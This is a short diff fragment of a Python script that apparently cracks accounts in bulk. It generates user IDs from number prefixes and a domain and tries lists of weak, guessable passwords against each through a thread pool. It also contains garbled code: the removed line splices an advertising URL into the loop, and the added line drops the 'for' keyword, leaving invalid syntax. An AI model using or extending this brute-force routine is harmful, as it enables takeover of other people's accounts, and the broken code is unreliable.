@@ -432,7 +432,7 @@ def mycrackistan():
                 crack_main().crackmail(id)
         elif '3' in clone_type:
                 crack_main().cracknum(id)
-https://www.toprevenuegate.com/w65djugnr2?key=c10a3acc28b1d77fcfb6751689441f12for guru in user:
+ guru in user:
             uid = kode+kodex+guru+doamin
             pwx = [kode,kodex,kode+kodex,kode+'@123',kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
             yaari.submit(rcrack1,uid,pwx,tl)
